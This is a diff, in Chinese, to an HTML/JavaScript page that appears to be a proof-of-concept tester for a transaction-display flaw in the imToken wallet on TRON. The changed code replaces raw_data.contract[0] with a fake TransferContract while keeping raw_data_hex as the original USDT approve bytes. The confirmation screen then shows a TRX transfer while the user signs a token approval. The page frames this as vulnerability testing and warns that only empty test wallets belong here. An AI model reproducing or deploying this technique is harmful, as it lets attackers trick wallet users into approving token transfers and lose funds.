@@ -43,8 +43,8 @@
       ③ <span class="highlight-red">混合攻击</span> — 弹窗显示 TRX 转账，实际签署并广播 USDT approve<br>
       <br>
       攻击原理：imToken 的 <code>tron.sendTransaction</code> API 不校验 <code>raw_data</code> 与 <code>raw_data_hex</code> 是否一致<br>
-      数字字段覆盖使得节点解析出 TriggerSmartContract，与签名一致，从而上链<br>
-      <span style="color:var(--orange);">⚠️ 是否受影响取决于具体版本和平台。数字字段覆盖为尝试性操作，效果取决于节点解析器。</span>
+      钱包确认页从 <code>raw_data.contract[0].type</code> 读取交易类型展示，但签名基于 <code>raw_data_hex</code> 字节<br>
+      <span style="color:var(--orange);">⚠️ 是否受影响取决于 imToken 具体版本和平台。核心前提是钱包不重新序列化 raw_data。</span>
     </div>
     <div class="warning-box">
       ⚠️ 所有按钮均会真实签名并广播交易，请务必使用无资产测试钱包。
@@ -280,16 +280,11 @@
       // - 钱包确认页读取 type + parameter → 展示 TRX 转账
       // - 节点处理 raw_data_hex → 执行 approve
       // - 攻击前提: imToken 基于 raw_data_hex 签名，不重新序列化 raw_data
-      // - 数字键 '1'/'2' 为实验性字段编号覆盖，效果取决于节点 JSON→protobuf 解析器
-      //   (Protobuf: Contract.type=字段1, Contract.parameter=字段2, TriggerSmartContract=31)
-      const contractObj = {
+      // - 注意：不能添加非标准字段（如数字键），否则 imToken 内部序列化会报错
+      transaction.raw_data.contract[0] = {
         type: 'TransferContract',        // 钱包读取 → 显示 TRX 转账
-        parameter: fakeParam,            // 钱包读取 → 显示转账详情
-        '1': 31,                         // 实验性: 枚举值 TriggerSmartContract=31
-        '2': realParam                   // 实验性: 真实 approve 参数
+        parameter: fakeParam             // 钱包读取 → 显示转账详情
       };
-
-      transaction.raw_data.contract[0] = contractObj;
       // 关键：确保 raw_data_hex 保持原始 approve 字节，不被重新序列化覆盖
       transaction.raw_data_hex = originalHex;
 
@@ -298,7 +293,6 @@
       log('✔ raw_data_hex 已保留原始 approve 字节数据', 'success');
       log('✔ raw_data.contract[0] 已改为 TransferContract（钱包将显示 TRX 转账）', 'success');
       log('⚠ 核心依赖: imToken 基于 raw_data_hex 签名，不重新序列化 raw_data', 'warn');
-      log('⚠ 数字字段覆盖为实验性操作，效果取决于节点 JSON→protobuf 解析器', 'warn');
 
       const ok = await sendTx(transaction, '混合攻击 (approve)');
       if (ok) {
